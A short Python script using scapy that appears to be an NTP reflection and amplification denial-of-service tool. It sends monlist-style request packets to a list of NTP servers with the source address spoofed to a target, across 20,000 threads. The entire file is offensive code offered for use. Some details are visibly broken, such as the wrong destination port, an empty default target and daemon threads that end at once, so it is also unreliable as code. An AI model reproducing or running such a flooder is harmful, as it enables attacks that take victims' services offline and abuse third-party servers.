from scapy.all import *
import threading
import random
import socket

with open("ntp_servers.txt", "r") as f:
    ntp_servers = f.readlines()

# payload
payload = "\x17\x00\x03\x2a" + "\x00" * 4


def flood(target="", port=443):
        server = random.choice(ntp_servers)
        server = server.replace("https://", "").replace("http://", "").replace("www.", "")
        print(server)
        server = server.replace("\n", "")
        print(server)
        while True:
            packet = IP(dst=server, src=target) / UDP(sport=random.randint(2000, 65500), dport=int(port)) / Raw(load=payload)
            send(packet, verbose=True)


numberthreads = 20000

for i in range(numberthreads):
    thread = threading.Thread(target=flood)
    thread.daemon = True
    thread.start()